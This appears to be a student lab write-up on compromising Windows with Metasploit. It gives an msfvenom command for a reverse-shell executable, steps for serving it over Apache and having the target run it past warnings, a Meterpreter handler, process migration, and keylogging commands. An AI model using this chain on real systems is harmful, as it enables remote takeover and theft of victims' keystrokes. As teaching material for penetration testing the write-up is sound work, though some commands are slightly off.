# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:

<img width="907" height="498" alt="image" src="https://github.com/user-attachments/assets/98843d66-af30-4315-8c0b-9df0ebc5c2cd" />


Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:

<img width="860" height="160" alt="image" src="https://github.com/user-attachments/assets/3804cda5-a538-45e2-b877-b4e372266a2f" />

copy the fun.exe into the apache /var/www/html folder

## OUTPUT:

<img width="522" height="51" alt="image" src="https://github.com/user-attachments/assets/b6a27ea0-4d8f-493c-a5b2-57c1d07ef2f1" />

Start apache server
sudo systemctl apache2 start
## OUTPUT:

<img width="505" height="51" alt="image" src="https://github.com/user-attachments/assets/23eb0be0-9f69-4cdb-be92-a39be46cb6e9" />

Check the status of apache2
## OUTPUT:

<img width="949" height="390" alt="image" src="https://github.com/user-attachments/assets/39d3cc5c-a1cc-495a-b24d-ba16d3325565" />


Invoke msfconsole:
## OUTPUT:

<img width="764" height="542" alt="image" src="https://github.com/user-attachments/assets/10ef68d4-84a6-401d-bf9d-9dbb0cedd752" />



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:

<img width="926" height="626" alt="image" src="https://github.com/user-attachments/assets/fcc8d7cf-f4c7-4106-9396-d825b754d4b6" />


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

<img width="740" height="102" alt="image" src="https://github.com/user-attachments/assets/a5f06b92-f8f9-4a98-b659-cea02ebb98ca" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:

<img width="1023" height="240" alt="image" src="https://github.com/user-attachments/assets/93dc5c1a-b290-41a1-850b-b9d5f3a5a5d4" />


Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:



On kali/parrot give the command exploit
## OUTPUT:
<img width="737" height="135" alt="image" src="https://github.com/user-attachments/assets/30f7485a-cae3-4e4f-a063-c6cff8b049d0" />



To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156




The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command:
netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:

<img width="798" height="457" alt="424630581-e61066d7-12fb-4942-9f01-3906941f7c47" src="https://github.com/user-attachments/assets/88ba6244-b34c-4503-a1fc-832c6f294b39" />


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:
<img width="157" height="29" alt="424630759-fd50817c-df2b-40e2-bcb3-920d2baa5da0" src="https://github.com/user-attachments/assets/251d89a5-8823-427b-a714-e2e7a033f204" />




keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:

<img width="420" height="91" alt="424631195-a5ce96df-cd40-4772-b531-90cf2462d6bf" src="https://github.com/user-attachments/assets/26888ecf-eec1-4c34-8c3c-673969839951" />

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


